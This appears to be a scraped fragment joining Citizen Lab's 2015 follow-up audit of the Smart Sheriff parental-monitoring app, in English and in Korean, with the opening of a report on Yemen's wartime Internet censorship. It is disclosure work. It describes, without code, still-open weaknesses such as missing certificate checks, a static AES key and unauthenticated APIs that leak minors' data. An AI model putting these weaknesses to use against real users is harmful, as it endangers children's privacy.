indicates that, beyond cosmetic changes, the application is functionally the same as Smart Sheriff 1.7.7 – which we analyze here. This new program inherits all the same security concerns as the original application.\nUPDATE (November 6, 2015): On November 4 2015, MOIBA released a statement explaining that since October, South Korean telecommunication companies have begun to provide Internet filtering software to users for free, and to avoid overlap with these companies Smart Sheriff will no longer be available for new users beginning on November 1 2015. Existing users will be transferred to filtering applications provided by South Korea Telecom, Korea Telecom, or LGU+. This statement makes no reference to the security issues we disclosed and presents the concern of not competing with the free applications as the the motivation for pulling Smart Sheriff from the market. This statement shows MOIBA is not being transparent with its users and the Korean public. We urge the providers of the alternative applications to ensure their products are secure and follow transparent and accountable processes with their users.\nBackground\nOn 20 September 2015, the Citizen Lab at the Munk School of Global Affairs, University of Toronto, released a report, “Are the Kids Alright? Digital Risks to Minors from South Korea’s Smart Sheriff Application.” The report detailed results of two independent audits of the privacy and security problems of Smart Sheriff, a parental monitoring application promoted by the South Korean government. In total, 26 security vulnerabilities that could compromise the privacy and security of minors and parents who use the Smart Sheriff application were found in the audits conducted by the Citizen Lab and Cure53, a German-based security audit firm. The vulnerabilities that were identified could be used by an attacker to disable Smart Sheriff accounts, tamper with data, and steal personal information for the application’s entire user base. We also noted several legal and policy issues related to the Smart Sheriff application. Detailed technical [pdf] and legal and policy [pdf] appendices were attached to our report. The first Cure53 audit, undertaken in August 2015, can be found here [pdf].\nWhile researching the report, we undertook a process of responsible disclosure to MOIBA, the Korean industry consortium responsible for the development of Smart Sheriff.  At that time, we requested MOIBA to suspend services or offer a complete timeframe for addressing the application’s issues. MOIBA chose not to shut down the application, and assured us that the issues would be fully addressed by the end of September. The issues documented by these audits were verified by MOIBA during this process, and no part of the report was disputed. The Citizen Lab and MOIBA exchanged communications several times concerning the vulnerabilities and discussed a reasonable timetable for MOIBA to address the vulnerabilities. In multiple exchanges MOIBA disclosed that they were not the original developers of the application, and were wholly reliant on a third-party contractor for all development on Smart Sheriff, with no in-house development capacity to address Citizen Lab’s concerns.\nLacking any further correspondence from MOIBA after several attempts on our part to communicate with them, we moved forward with our publication on 20 September 2015.  We noted that “MOIBA has not fully apprised us of the manner in which the vulnerabilities were addressed.”  We also urged “caution against further public use and promotion of the application until an independent and thorough audit of Smart Sheriff can be conducted.”  In press coverage related to the release of our report, MOIBA claimed to have “immediately taken action,” creating an impression that the vulnerabilities of Smart Sheriff had been properly addressed.\nThe Follow-Up Audit\nCure53 undertook a second audit of the Smart Sheriff application in early October 2015. This audit looked at version 1.7.7 downloaded from Google Play. This second audit raised several very concerning findings, which overall suggest that serious problems remain with the Smart Sheriff application and call into question MOIBA’s efforts to address the vulnerabilities.\nBelow is a list of general risks that remain related to the Smart Sheriff application:\n\nIf an attacker knows the mobile number of a minor they are still able to get the minor’s date of birth, a list of all apps on the minor’s phone, and all blocking rules.\nAn attacker can still arbitrarily change blocking rules and registration settings on a minor’s phone, enabling an attacker to shut out access to their device.\nAttackers are still able to retrieve a parent’s Smart Sheriff application password, and the parental phone number associated with a minor’s account.\nNewer versions of Smart Sheriff implement encryption on all their API request data, but this encryption is done with a static, symmetric key. An attacker can easily find this key by decompiling the source code, rendering the protections of this encryption useless.\nNewer versions of Smart Sheriff use HTTPS to communicate with MOIBA servers, but there is still no verification of the validity of the given certificate — a problem we repeatedly raised in communications with MOIBA. This problem means that the application is still vulnerable to a “man-in-the-middle” attack, as outlined in the initial report.\n\nCurrent Status of Issues Originally Identified as High Priority\n\n\n\nIssue Number\nIssue Summary\nCurrent Status;\nIssue Still Exploitable?\n\n\n1.1\nNo transport security used from app to MOIBA servers.\nHTTPS was added but no certificate verification occurs rendering this fix insufficient.\nYes\n\n\n1.2\nMan in the middle via insecure web view.\nMan-in-the-middle still possible because issue 1.1 remains.\nYes\n\n\n1.3\nDisclosure of user traffic in clear text.\nUse of static AES key means that although user traffic is not as easy to read to casual observers, information is disclosed for any determined attacker.\nYes\n\n\n2.2\nParent password disclosure.\nFixes were implemented to obscure password but these fixes can be easily circumvented.\nYes\n\n\n3.1\nIdentification to API based on predictable identifiers.\nIdentifiers remain, requests are encrypted but issue 1.3 means determined attacker can still find these.\nYes\n\n\n3.2\nAPI queries don’t have authentication.\nIssue remains unchanged since original report.\nYes\n\n\n3.3\nArbitrary users can change protection settings.\nIssue remains unchanged since original report.\nYes\n\n\n3.5\nArbitrary users can claim arbitrary phone numbers.\nIssue was untested.\nIndeterminate\n\n\n3.9\nParental control Web UI allows device control and leaks personal information.\nPages that returned PII previously now return 404.\nNo\n\n\n3.10\nParental control web UI allows attackers to change account settings.\nPages that returned PII previously now return 404.\nNo\n\n\n\nOverall, while some changes have been made in response to the initial disclosure made by Citizen Lab to MOIBA, attackers still have most of the same opportunities to exploit vulnerabilities in the application as they did in previous versions. Many of the issues that were marked as high priority in the previous report, such as the lack of protections around sensitive private data, and transport security, remain effectively unaddressed. One of the problems successfully addressed related to vulnerabilities that allowed a minor to bypass web filtering (such as issue 2.1 referenced in our technical appendix).  Systemic issues remain, such as the lack of authentication for API requests. Attempts to address other issues, such as transport security, have been poorly implemented, nullifying any security benefit.\nIn sum, it appears that MOIBA has attempted to address a select few of the server issues and back-end vulnerabilities that could affect its networks, but has not yet adequately addressed the vulnerabilities that directly affect the privacy and security of the users of its application.\nNext Steps\nCure53’s follow-up audit, published on October 31, 2015, is here. We will be monitoring the steps MOIBA takes after the report, and whether the security issues in Smart Sheriff 1.7.7 are addressed in any updates.\nMeanwhile, the Citizen Lab and Cure53 recommend immediate withdrawal of Smart Sheriff from the public market, and that existing users discontinue their use of the application.\nConcluding Remarks\nThe Smart Sheriff case illustrates the importance of examining privacy and security around all applications, but especially those involving minor children and other users who could be considered at high risk.\nIt also underscores a broader public policy issue: government-mandated applications will result in a large number of users, who, in turn, will attract a large number of potential attackers. When governments mandate the use of a specific application by the general public there must be an exceptionally rigorous process of due diligence around security and privacy that is transparent and accountable to the users.\nIn all these respects, Smart Sheriff is a failure.  MOIBA, the Korean industry consortium responsible for the Smart Sheriff application, has been slow to respond to the issues raised (of which it was notified more than 90 days ago); the fixes that have been applied do not adequately or effectively address the issues, especially for users; and MOIBA has not communicated transparently to the public about Smart Sheriff’s known risks.\nSmart Sheriff should serve as a cautionary case study, as attempts to protect a vulnerable group through a mandated application have ended up actually endangering that very group. Regardless of the initial intentions of the program, after three months of study and follow-up, it is clear that a user’s security and privacy are better served by uninstalling the Smart Sheriff application than running it.\n\n\t\t\t\t\n\t\t\t",

Digital Risks to Minors from South Korea’s Smart Sheriff Application)”을 발표했다. 동 보고서는 한국 정부가 권장하는 유해정보 차단 소프트웨어인 “스마트보안관”의 프라이버시 보호 정도 및 보안성에 대한 독립적인 두 건의 감사 결과를 상세하게 서술하고 있다. 시티즌랩과 독일계 보안감사 전문회사인 Cure 53가 수행한 보안감사에서 스마트보안관을 사용하는 청소년과 부모들의 프라이버시와 보안을 위협하는 26건의 취약점이 발견되었다. 이러한 취약점들은 사이버공격자들이 스마트보안관 계정을 무력화하거나, 데이터를 변조하거나, 전체 이용자 데이터베이스에서 개인정보를 절취하는 데 악용될 수 있다. 또한 스마트보안관과 관련된 법적, 정책적 문제점들도 지적되었다. 보고서에는 상세한 기술적[pdf] 및 법적·정책적[pdf] 부록이 첨부되어 있다. 2015년 8월에 수행된 Cure53의 첫 번째 감사 결과는 여기 [pdf]에서 확인할 수 있다.\n보고서를 작성하는 동안, 시티즌랩은 ‘책임있는 공개(responsible disclosure)’ 절차에 따라 스마트보안관을 개발한 MOIBA에게 관련 내용을 고지했다. 당시 시티즌랩은 MOIBA에게 서비스를 중단하거나, 어플리케이션의 문제점을 수정하는데 필요한 기간을 제시해달라고 요청했다. MOIBA은 어플리케이션을 중단시키는 대신 9월말까지 모든 문제점을 수정하겠다고 답변했다. 또한 MOIBA는 보안감사에서 발견된 문제점들을 인정했으며, 보고서의 어떠한 내용에 대해서도 이의를 제기하지 않았다. 시티즌랩과 MOIBA는 취약점들에 대해 수차례 연락을 주고받았고, MOIBA가 취약점을 보완하기 위해 필요한 합리적인 기간에 대해 논의했다. 그 과정에서 MOIBA는 자신들이 어플리케이션의 원개발자가 아니며, 스마트보안관의 모든 개발사항에 대해서는 외부 개발자에 의존하고 있어 시티즌랩의 우려를 해결할만한 자체 개발능력이 없다고 밝혔다.\n이후 시티즌랩은 여러 번 연락을 시도했으나 MOIBA로부터 답이 오지 않아 9월 20일 보고서를 발표하게 되었다. 보고서에서 시티즌랩은 “MOIBA가 취약점을 어떻게 보완했는지에 대해 충분히 알려주지 않았다”는 점을 지적했고,  “스마트보안관에 대해 독립적이고 철저한 보안 감사가 이루어지기 전까지는 해당 앱의 추후 사용과 홍보를 자제”할 것을 촉구했다. MOIBA는 시티즌랩 보고서 발표에 대한 언론보도에서 “즉시 조치를 취했다”고 주장하여, 스마트보안관의 취약점들이 제대로 수정된 것과 같은 인상을 주었다.\n후속 감사\n2015년 10월 초 Cure 53는 스마트보안관에 대해 2차 감사를 수행했다. 2차 감사는 구글 플레이에서 다운로드한 1.7.7 버전을 대상으로 했다. 2차 감사로부터 스마트보안관 앱에 심각한 문제점들이 아직 남아있음을 시사하고 MOIBA가 취약점을 보완하려고 충분한 노력을 기울였는지에 대해 의문을 갖게 하는 매우 우려스러운 결과가 나왔다.\n스마트보안관이 여전히 가지고 있는 일반적인 위험은 아래와 같다:\n\n공격자가 청소년의 휴대폰 번호를 알고 있다면 청소년의 생년월일, 청소년의 휴대폰에 설치된 모든 앱의 목록, 그리고 모든 차단 규칙을 취득할 수 있다.\n공격자는 여전히 청소년의 휴대폰의 차단 규칙이나 설정을 마음대로 변경할 수 있기 때문에 청소년이 휴대폰을 사용하지 못하도록 잠글 수 있다.\n공격자는 여전히 스마트보안관 부모용의 비밀번호와 청소년의 계정과 연계된 부모의 휴대폰 번호를 찾아낼 수 있다.\n스마트보안관의 신 버전들은 모든 API 요청데이터에 대한 암호화를 구현했으나, 이 암호화는 고정된 대칭키를 사용하고 있다. 공격자는 소스코드를 디컴파일해서 해당 키를 찾아 암호화를 무력화시킬 수 있다.\n스마트보안관의 신 버전들은 MOIBA서버와 통신시 HTTPS를 사용하지만, 여전히 인증서의 유효성을 검증하지 않고 있다. 이미 반복적으로 MOIBA에게 제기한 문제이다. 이 문제는 최초 보고서에서도 설명한 바와 같이 스마트보안관이 여전히 “중간자(MITM)” 공격에 취약하다는 것을 의미한다.\n\n매우 중요하다고 판단된 문제들의 현재 상태 \n\n\n\n문제 번호\n\n\n\n\n문제 요약\n\n\n\n\n\n\n\n\n현재 상태\n\n\n\n\n\n\n\n\n여전히 공격이 가능한지 여부\n\n\n\n\n\n\n1.1\n앱과 MOIBA 서버 간의 전송보안 부재\nHTTPS 추가됐으나 인증서 검증을 하지 않아 보완이 소용 없음\n\n\n\n\n예\n\n\n\n\n\n\n1.2\n안전하지 않은 웹뷰로 중간자 공격 가능\n문제 1.1이 해결되지 않아 중간자 공격 여전히 가능\n예\n\n\n1.3\n이용자 트래픽이 암호화되지 않은 채 노출됨\n고정된 AES 키 사용은 이용자트래픽이 일반 관찰자에게는 쉽게 읽히지 않겠지만, 작심한 공격자에게는 정보가 노출된다는 의미임\n예\n\n\n2.2\n부모 비밀번호 노출\n비밀번호를 은폐하기 위한 보안이 이루어졌지만 쉽게 우회될 수 있음 \n예\n\n\n3.1\n 예측가능한 식별자에 의한 API 식별\n식별자 여전히 존재, API 요청은 암호화되었지만 문제 1.3이 계속 존재함에 따라 작심한 공격자는 이 식별자들을 찾아낼 수 있음 \n예\n\n\n3.2\nAPI 쿼리가 인증을 거치지 않음\n원 보고서 이후 변화 없음 \n예\n\n\n3.3\n불특정이용자가 보호설정을 변경할 수 있음\n원 보고서 이후 변화 없음\n예\n\n\n3.5\n불특정이용자가 불특정 번호를 등록하여 이용할 수 있음\n시험하지 않았음 \n\n\n\n\n판단 불가\n\n\n\n\n\n\n3.9\n부모용 관리 웹UI를 통해 공격자가 기기설정을 변경하거나 개인정보를 취득할 수 있었음\n이전에는 개인식별정보를 노출시켰던 페이지가 404로 답함\n아니요\n\n\n3.10\n부모용 관리 웹UI를 통해 공격자가 계정설정을 변경할 수 있었음\n이전에는 개인식별정보를 노출시켰던 페이지가 404로 답함\n\n\n\n\n아니요\n\n\n\n\n\n\n\n종합적으로, 시티즌랩과 MOIBA 간의 최초 공개에 대한 대처로 몇 가지 수정 및 보완이 이루어졌지만, 구 버전들과 마찬가지로 신 버전에서도 공격자들이 취약점을 악용할 수 있는 가능성은 거의 동일하다. 또한 민감한 개인정보 및 전송 보안의 보호 결여를 포함하여, 1차 보고서에서 중요하다고 강조된 많은 문제들이 제대로 해결되지 않은 채 남아 있었다. 단 한 가지 성공적으로 수정된 사항이라면 청소년들이 필터링을 우회하는 방법과 관련된 것이다(예컨대 기술적 부록에서 언급한 문제 2.1 등). API 요청 인증 결여와 같은 시스템적 문제들도 여전하다. 전송 보안과 같은 다른 문제들은 매우 불완전하게 수정되어 보안 혜택을 무력화한다.\n요약하면, MOIBA는 네트워크에 영향을 미칠 수 있는 서버 문제나 백엔드 취약점 몇 가지를 수정하려 했을 뿐, 어플리케이션을 사용하는 이용자들의 프라이버시나 보안에 직접 영향을 미치는 취약점들은 제대로 수정하지 못했다.\n향후 계획\n2015년 10월 31일에 공개된 Cure53의 후속 감사는 여기에서 확인할 수 있다. 시티즌랩은 보고서  공개에 따른 MOIBA의 대응과 스마트보안관 1.7.7 버전의 보안 문제가 업데이트를 통해 수정되는지 여부를 지켜볼 것이다.\n시티즌랩과 Cure 53는 그 동안 스마트보안관을 지체 없이 오픈마켓에서 내리고, 현재 사용자들은 스마트보안관의 사용을 즉시 중단할 것을 권고한다.\n맺음말\n스마트보안관 사례는 모든 어플리케이션, 그 중에서도 특히 취약한 어린 청소년들과 다른 이용자들이 사용하는 어플리케이션의 프라이버시 보호 정도와 보안성 검사의 중요성을 잘 보여준다.\n또한 보다 광범위한 공공정책의 문제도 드러낸다. 정부가 사용을 강제하는 어플리케이션들은 많은 이용자를 모으게 되고, 많은 이용자들은 많은 잠재적 공격자들을 유인한다는 것이다. 정부가 국민들에게 특정 어플리케이션의 사용을 강제하는 경우에는 반드시 투명하고 책임있는 절차에 의한 보안성과 프라이버시 보호에 대한 특별히 엄격한 실사가 이루어져야 한다.\n모든 면에서 스마트보안관은 실패작이다. 스마트보안관을 보급·관리하는 한국무선인터넷산업연합회 MOIBA는 제기된 문제들을 신속히 보완하지 못하였으며 (문제를 인식한지 90일이 넘었음에도 불구하고), 보안 업데이트는 특히 이용자의 보안과 관련된 문제들을 적절하고 효과적으로 해결하지 못했고, MOIBA는 이미 알고 있는 스마트보안관의 위험에 대해 대중에게 투명하게 밝히지 않았다.\n스마트보안관은 취약한 집단을 보호하기 위한 시도로써 특정 어플리케이션을 강제해 오히려 그 집단을 위험에 노출시킨 사안으로 교훈적인 연구 사례가 될 것이다. 3개월간의 연구와 후속 조사의 결과, 정책의 초기 의도가 무엇이었든지 간에 이용자의 보안과 프라이버시 보호를 위해서는 스마트보안관을 사용하는 것 보다 당장 삭제하는 것이 바람직하다.\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tAuthors: Jakub Dalek1, Ronald Deibert1, Sarah McKune1, Phillipa Gill2, Naser Noor3, and Adam Senft1\n1 Citizen Lab, Munk School of Global Affairs, University of Toronto\n2 Stony Brook University\n3 Independent Researcher\nRead the press release.\nDownload PDF version.\nMedia coverage: The Globe and Mail, Motherboard, Toronto Star, Metro News, The Daily Beast, Al Jazeera America.\nKey Takeaways\n\nThis report provides a detailed, mixed methods analysis of Information controls related to the Yemen armed conflict, with research commencing at the end of 2014 and continuing through October 20, 2015.\nThe research confirms that Internet filtering products sold by the Canadian company Netsweeper have been installed on and are presently in operation in the state-owned and operated ISP YemenNet, the most utilized ISP in the country.\nNetsweeper products are being used to filter critical political content, independent media websites, and all URLs belonging to the Israeli (.il) top-level domain.\nThese new categories of censorship are being implemented by YemenNet, which is presently under the control of the Houthis (an armed rebel group, certain leaders and allies of which are targeted by United Nations Security Council sanctions).\nWe identify disruptions to infrastructure, such as electricity and fuel, as an important component of information controls in the conflict. Although we are unable to attribute specific disruptions to parties responsible, we find that on balance the limited access to information brought about by the disruptions favours the interests of the Houthis.\nNetwork measurements tests undertaken in Saudi Arabia and Iran show that there is a significant international “spillover” of information controls among state parties to the conflict; both states have blocked websites related to their opponents in the ongoing political and military conflicts.\n\nDetailed Summary\nRecent political conflicts and periods of violent unrest — such as those in Syria, Thailand, and Iraq — have demonstrated the ways in which information and communications often become a focal point of contestation during a crisis. As information becomes a critical factor in a conflict, information controls — which we define as actions conducted in or through information and communication technologies that seek to deny, disrupt, secure, or monitor information for political ends — may increase in scope, intensity, and depth. Authorities may introduce new types of censorship as a means of preventing information from leaving the country, or in some cases even cut off access to communications entirely, such as the Internet or mobile phones services. Service providers may be required to undertake emergency measures to control information or communications, or suspend services because of violence, loss of personnel, or disruptions to their infrastructure. Contests over information controls can also become “internationalized” as outside parties to the conflict, including neighboring states, companies, non-state groups, and civil society, get involved and take action that impacts the information environment in the zone of conflict and beyond.\nThis report presents research on information controls in the context of the ongoing Yemeni armed conflict.  After months of crisis following the September 2014 Houthi rebel takeover of the capital Sana’a, the situation in Yemen degenerated into ongoing violent conflict. The conflict has expanded since 2014 to include a military response from a coalition of Arab states led by neighbouring Saudi Arabia.\nUsing a combination of network measurement tests, reference to technical data sources, as well as contextual and in-country field research, we undertook a detailed examination of information controls related to the Yemeni armed conflict from the end of 2014 to October 2015.   Our research was guided by the following framing questions:\n\nHow is access to infrastructure, including basic electricity and fuel, a component of information control in Yemen’s armed conflict?  Do disruptions to infrastructure favour one side of the conflict over others? Can we attribute disruptions to infrastructure to specific parties to the armed conflict?\n\nCitizens’ ability to access information has been significantly impacted by the ongoing violence, with deliberate power outages and shortages of fuel used to power generators further weakening the country’s infrastructure. Citizens are unable to power their computers, TVs, or mobile phones. These disruptions have limited citizens’ ability to communicate with their families, keep abreast of news related to local developments, or receive advance warning from Saudi-led coalition forces to leave their homes prior to airstrikes in active military conflict zones. The disruptions, though difficult to attribute to any particular group, favour the Houthis who have a demonstrated interest in restricting information flow.\n\nWhat other techniques of information control factor into the Yemen armed conflict?\n\nInformation controls in Yemen have taken different forms. The Houthi rebels have banned domestic telecommunication providers from sending news updates generated by local and regional media to subscribers. They have raided and shut down TV channels and radio stations, arrested journalists, raided newspaper offices, and blocked websites of local and regional media.  We also take note of numerous reports of digital surveillance, but were unable to draw positive conclusions about the veracity of these reports or map Yemen’s surveillance infrastructure.\n\nIs Internet censorship a factor in the armed conflict? Have Yemen’s Internet content filtering practices shifted substantially, and if so how? How transparent is the filtering?\n\nWe find that information controls implemented by Yemen’s national ISP, YemenNet, a state-owned and operated national ISP that has served the entire country since 2001, and which is now controlled by the Houthi rebels, have changed substantially since the Houthi takeover of the capital and, by extension, control over the Ministry of Communications and Information Technology.  Content filtering now includes a wide variety of political content, and blocking of the entire .il (Israel) domain. We also determine that all political filtering that targets local and regional news and media content is undertaken in a non-transparent way, with fake network error pages delivered back to users instead of block pages.\n\nWhat equipment is used for content filtering?  Can we identify the manufacturer of filtering services?  Did that company undertake any due diligence around providing services to a country in the midst of an armed conflict, and to ISPs now under the control of a group (the Houthis) whose leaders are subject to UN Security Council sanctions?\n\nOur prior research on Yemen (as part of the OpenNet Initiative) identified Websense, and later Netsweeper, as commercial providers of content filtering services and equipment to Yemen’s ISPs.  In our latest research, we are able to positively verify that Netsweeper is still provisioning services to YemenNet.  We also conducted an experiment confirming that Netsweeper is actively updating Netsweeper installations in the country, and thus knows or has reason to know of the recent expansion of the filtering regime to include political content linked to the conflict and the Houthi takeover. As part of the research for this report, on October 9, 2015 we sent a letter to Netsweeper regarding its provision of services to YemenNet and its human rights due diligence.  As of the date of publication, we have not received a reply.\n\nHave information controls been “internationalized” as part of the Yemen armed conflict?\n\nIn prior research, we have observed that information controls can “spill out” of a particular conflict and affect access to the Internet in other countries. To continue this line of inquiry, we undertook network measurements in Saudi Arabia and Iran. We find that that Saudi Arabia has implemented new Internet content filtering aligned with its military operations in Yemen. We also find that there is significant similarities between content filtering undertaken in Iran and that which has been implemented in Yemen since the Houthi takeover.\nOur report begins with background to Yemen and the armed conflict, as well as to the history of  information controls in the country. Part 1 provides a summary examination of information controls around the armed conflict based on contextual and field research. Part 2 presents the findings of the network measurement tests we undertook for Internet content filtering in Yemen, Saudi Arabia, and Iran, and details experiments we undertook to confirm Netsweeper’s provision of services in Yemen. We evaluate Netsweeper’s provision of services on the basis of existing human rights laws and norms, and provide details on questions we sent to the company. We conclude the report with observations on research on information controls in armed conflict in general, and the Yemen case in particular.\nFull Report: Background\n2015 Political and Armed Conflict\nYemen is strategically located on the Bab al-Mandab strait, which links the Red Sea with the Gulf of Aden and is a passage for much of the world’s oil shipments. However, power struggles and unequal access to resources have frequently led to violent conflict and instability in the country — the poorest in the Middle East with a weak governance system and widespread corruption. Yemen has also been the base for attacks staged by the militant Islamist group al-Qaeda in the Arabian Peninsula (AQAP), posing a security threat at the regional and international levels. There have been six armed conflicts between the government of former president Ali Abdullah Saleh and the Shiite Houthi rebels, also known as Ansar Allah (Partisans of God), from 2004 until a ceasefire was signed in 2010. Saleh was removed from power in 2011 following popular uprisings in which the Houthis participated. Taking advantage of the vacuum created afterwards, the Houthis expanded their power to more provinces outside their stronghold Saada, and eventually seized control of the government.\nSubsequent to this power shift, former President Saleh allied himself with the Houthis. A letter from the United Nations Panel of Experts on Yemen, established pursuant to Security Council resolution 2140, notes that interlocutors informed the panel that “despite waging six wars against the Houthi movement in the north of the country between 2004 and 2010,” Saleh has “aligned himself with the Houthis to destroy the power base and property of his enemies,” “ordered his supporters in the Government, the security services and the tribes not to intervene and curb Houthi forces in the achievement of their goals,” and that “Saleh was seeking revenge against these people for contributing to his loss of power in 2011 and 2012” (para. 80).\nYemeni President Abd-Rabbu Mansour Hadi, who took power after Saleh’s departure in 2011, and his government submitted their resignations in January 2015 after the Houthis expanded their control by force over the country. The Houthis then put the president and government cabinet members under house arrest. In February 2015, the Houthis unilaterally announced a constitutional declaration that dissolved parliament and formed a “revolutionary committee” chaired by Mohammed al-Houthi, a relative of the group’s leader Abdulmalik al-Houthi. The Houthi-led revolution committee became the de facto government and Houthis the de facto rulers running the country.\nOn March 27, 2015, Saudi Arabia formed and led a coalition of Arab states in launching airstrikes in Yemen against the Houthi rebel group as it continued to take over more parts of the country, including the capital Sana’a. The coalition of states included majority Sunni Muslim countries United Arab Emirates, Kuwait, Bahrain, Qatar, Jordan, Morocco, Sudan, and Egypt.  The coalition considered the Houthis, who are Shiite Muslims, to be proxies for the Shiite government of Iran, which condemned the military intervention. The coalition also imposed a naval blockade of ports in Yemen at the end of March, restricting imports including food and other basic necessities, which has contributed to the humanitarian crisis in the country.\nAdel al-Jubeir, the Saudi ambassador to the United States, said when announcing the start of the military intervention: “This is really a war to defend the legitimate government of Yemen and protect the Yemeni people from takeover by a radical militant group aligned with Iran and Hezbollah.” The military intervention was requested by President Hadi, who had fled the country to the Saudi capital city of Riyadh after the Houthis and their allies advanced to the city of Aden, in southern Yemen, where he had taken refuge.\nThe Houthis warned against the coalition military operation in Yemen, saying president Hadi’s request for military intervention could lead to civil war and that the operation is a “conspiracy against Yemen and proves Hadi is a traitor.” An official from the General People’s Congress (GPC) led by former President Saleh — an ally of the Houthis — criticized President Hadi’s move, saying “Yemenis will reject any interference because it will bring more problems than solutions.”\nThe United Nations Security Council (UNSC) has taken action concerning the situation in Yemen. In February 2014 the UNSC adopted resolution 2140 under Chapter VII of the UN Charter, in which it expressed “concern at the ongoing political, security, economic and humanitarian challenges in Yemen, including the ongoing violence,” and decided that all UN member states must enact an assets freeze and travel ban against individuals designated by a newly established sanctions committee (the “2140 Committee”) as “engaging in or providing support for acts that threaten the peace, security or stability of Yemen.” The measures implemented in that resolution were renewed and extended in February 2015 in resolution 2204. Also in February 2015, the UNSC expressed grave concern in its resolution 2201 over escalating violence and other actions of the Houthis, noting as well its concern over “the takeover by the Houthis of state media outlets and reject[ing] the use of the media to incite violence.”\nShortly thereafter, in its resolution 2216 of April 2015, the UNSC demanded that “all parties in the embattled country, in particular the Houthis, immediately and unconditionally end violence and refrain from further unilateral actions that threatened the political transition.” It further demanded that the Houthis “refrain from any provocations or threats to neighbouring States, release the Minister for Defence, all political prisoners and individuals under house arrest or arbitrarily detained, and end the recruitment of children.” Additionally, the UNSC decided that member states would expand sanctions to include an arms embargo against designated individuals, and named additional persons to the 2140 Committee’s list.\nThe list established and maintained by the 2140 Committee currently designates the following individuals, whom the UNSC and the 2140 Committee have found to threaten the peace, security, or stability of Yemen:\n\nFormer President Ali Abdullah Saleh, who, “[a]s of fall 2012, . . . had reportedly become one of the primary supporters of violent [Houthi] actions in northern Yemen. More recently, as of September 2014, Saleh has been destabilizing Yemen by using others to undermine the central government and create enough instability to threaten a coup. . . . The September 2014 United Nations Panel of Experts report on Yemen also states that allegations have been made that Ali Abdullah Saleh has been using Al-Qaida in the Arabian Peninsula (AQAP) operatives to conduct assassinations and attacks against military installations in order to weaken President Hadi and create discontent within the army and broader Yemeni population” (2140 Committee narrative summary of reasons for listing).\nAhmed Ali Abdullah Saleh, the son of former President Saleh, who “has been working to undermine President Hadi’s authority, thwart Hadi’s attempts to reform the military, and hinder Yemen’s peaceful transition to democracy” (UNSC resolution 2216, Annex).\nAbdulmalik al-Houthi, who “assumed the leadership of Yemen’s Houthi movement in 2004 after the death of his brother, Hussein Badredden al-Houthi. As leader of the group, al-Houthi has repeatedly threatened Yemeni authorities with further unrest if they do not respond to his demands and detained President Hadi, Prime Minister, and key cabinet members” (UNSC resolution 2216, Annex).\nAbdullah Yahya al Hakim, the “[Houthi] group second-in-command,” who “reportedly held a meeting in order to plot a coup” against Yemeni President Hadi and commanded forces that engaged in violent takeovers in the country; in late 2014 his role was to “organize military operations so as to be able to topple the Yemeni Government, and he was also responsible for securing and controlling all routes in and out of Sana’a” (2140 Committee narrative summary of reasons for listing).\nAbd al-Khaliq al-Huthi, a “[Houthi] military commander” who “led a group of fighters dressed in Yemeni military uniforms in an attack on locations in Dimaj, Yemen. The ensuing fighting resulted in multiple deaths.” Moreover, “unknown number of unidentified fighters allegedly were prepared to attack diplomatic facilities in Sana’a, Yemen, upon receiving orders from the Abd al-Khaliq al-Huthi” (2140 Committee narrative summary of reasons for listing).\n\nUN member states have enacted sanctions against these designated individuals reflecting the UNSC resolutions. Canada, the United States, and the European Union, among others, have all implemented Yemen-related sanctions.\nAs the armed conflict continues to escalate, the UN sponsored peace talks on the conflict in Yemen in Geneva in June 2015 between delegations from President Hadi and the Houthi rebels. The talks, however, failed to produce a ceasefire.\nIn July 2015, the Saudi-led coalition successfully pushed Houthi forces from the strategic southern port city of Aden, which permitted both the first delivery of food aid to Aden’s port and the first flights to land at Aden airport since March 2015. The re-capture of Aden appeared to mark a turning point in the conflict, as coalition forces began preparing to advance on the Houthi-controlled capital of Sana’a. Troops from numerous coalition countries began to arrive near the city of Marib to participate in military operations there, in advance of operations on Sana’a. By the first week of September 2015, coalition airstrikes had escalated in Sana’a following a Houthi-led attack that killed 60 coalition soldiers in Marib.\nIn the midst of the military build-up, both sides agreed on September 11, 2015 to engage in United Nations-mediated peace talks the following week. The talks aimed to “create a framework for an agreement on implementation mechanisms for UN Security Council resolution 2216, a ceasefire and the restoration of a peaceful political transition.” However, Hadi later pulled out of the talks, as he conditioned his participation on Houthi agreement to accept the UN resolution. As no major political breakthrough has occurred, the Houthis have maintained their grip on power. In October 2015 they mobilized tribes loyal to them to stand united against activities perceived hostile to the Houthis. An agreement (in Arabic) signed by tribesmen and published by the government news agency (Saba News) under the control of Houthis said the tribes declared “freedom of liability,” a term used to describe the tribal tradition that should someone hurt or even kill someone else for hostile activity, the offender would not be held responsible. The statement added that the “wrongdoers” should be punished according to tribal traditions, even if a political settlement is reached.\nThe United Nations High Commissioner for Human Rights released a report in September 2015 detailing the impact of the violence in Yemen, with over 1500 civilian casualties and widespread violations of international human rights law and humanitarian law. Saudi Arabia, however, has resisted calls by the United Nations Human Rights Council “for an international inquiry into abuses by all parties to the Yemeni conflict.” In October 2015, the Netherlands withdrew a draft resolution that it, along with other Western countries, had sponsored that would have requested the United Nations High Commissioner for Human Rights to “send experts to Yemen to investigate the conduct of the war.” Reacting to the collapse to establish an independent, international investigation into the conflict, Amnesty International, which headed the organization’s fact-finding mission to Yemen, stated, “The world’s indifference to the suffering of Yemeni civilians in this conflict is shocking. The failure of the UN Human Rights Council last week to establish an international investigation into violations committed by all sides is the latest in a series of failures by the international community to address total impunity for perpetrators of serious violations in Yemen.” Based on a report published in October 2015, Amnesty International stated: “Damning evidence of war crimes by the Saudi Arabia-led coalition, which is armed by states including the USA, highlights the urgent need for independent, effective investigation of violations in Yemen and for the suspension of transfers of certain arms.”\nInternet Infrastructure and Market in Yemen\nYemen has a small but rapidly growing population of Internet users. In 2014 the International Telecommunications Union (ITU) estimated that 22.55% of Yemeni citizens used the Internet, up from less than 1% a decade earlier and that the country has 340,000 fixed-broadband subscriptions, which works out to 1.36 subscriptions per 100 inhabitants. In March 2014, PTC estimated (in Arabic) the number of Internet users in Yemen to be 3,240,109 and the number of Internet cafes as 12,008. Mobile use has increased quickly in the last several years, with ITU statistics estimating the number of cellular subscriptions in the country in 2014 at just over 17 million.\nYemen is primarily served by one Internet service provider, the state-run YemenNet, which dominates the market amid calls from users to end the government monopoly over the Internet industry. YemenNet is part of the state-owned Public Telecommunication Corporation, (PTC), which operates under the supervision of the Ministry of Communications and Information Technology. TeleYemen, another state-owned telecommunication provider, also provides Internet services, but its share of the market is not known. Yemen’s National Security Agency uses Internet filtering software to block political and pornographic content, which slows down 